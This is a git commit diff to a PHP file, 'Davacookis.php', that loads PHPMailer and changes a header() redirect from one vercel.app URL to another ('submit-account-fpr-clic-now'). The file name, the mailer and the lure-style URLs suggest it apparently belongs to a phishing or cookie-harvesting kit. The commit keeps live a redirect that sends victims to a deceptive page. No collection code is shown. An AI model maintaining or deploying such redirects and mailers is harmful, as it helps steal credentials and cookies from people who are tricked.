d4c3e79621075ab3419cea4663ac33b00cab6eeb
maolpase721 <maolpase@gmail.com>
2025-09-05 12:13:23 +0500

    Update Davacookis.php

--- Davacookis.php
+++ Davacookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://sure-now-your-in.vercel.app/");
+header("Location: https://submit-account-fpr-clic-now.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
